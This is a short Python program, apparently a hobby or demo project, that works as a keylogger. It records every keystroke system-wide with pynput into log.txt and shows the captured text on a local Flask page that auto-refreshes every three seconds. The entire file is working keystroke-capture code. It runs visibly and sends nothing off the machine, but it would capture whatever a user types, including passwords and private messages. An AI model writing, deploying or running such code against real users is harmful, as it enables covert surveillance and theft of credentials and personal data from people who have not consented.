import os
from pynput.keyboard import Key, Listener
from flask import Flask, render_template_string
import threading

log_file = "log.txt"

# Ensure the log file exists (auto-create if not)
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        f.write("=== Keylogger Started ===\n")
# -------------------
# Keylogger Part 
# --------------------
def on_press(key):
    write_file(key)
    try:
        print(f"alphanumeric key {key.char} pressed")
    except AttributeError:
        print(f"special key {key} pressed")

def write_file(key):
    with open(log_file, "a") as f:
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.tab:
            f.write("\t")
        else:
            k = str(key).replace("'", "")
            f.write(k)

def on_release(key):
    print(f"{key} released")
    if key == Key.esc:
        return False

# ---------- --------
# Flask Web Server 
# ------------------
app = Flask(__name__)

@app.route("/")
def index():
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            content = f.read()
    else:
        content = "No logs yet."
    
    # -------
    # HTML 
    #--------
    html = """
    <html>
    <head>
        <title>Keylogger Logs</title>
        <meta http-equiv="refresh" content="3"> <!-- Auto refresh every 3s -->
        <style>
            body { font-family: Arial; background: #f5f5f5; padding: 20px; }
            pre { background: white; padding: 15px; border-radius: 10px; box-shadow: 0 0 10px #ccc; }
        </style>
    </head>
    <body>
        <h2> Captured Keystrokes</h2>
        <pre>{{content}}</pre>
    </body>
    </html>
    """
    return render_template_string(html, content=content)

def run_flask():
    app.run(host="127.0.0.1", port=5000, debug=False)



if __name__ == "__main__":



    threading.Thread(target=run_flask, daemon=True).start()

    # Run Keylogger
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

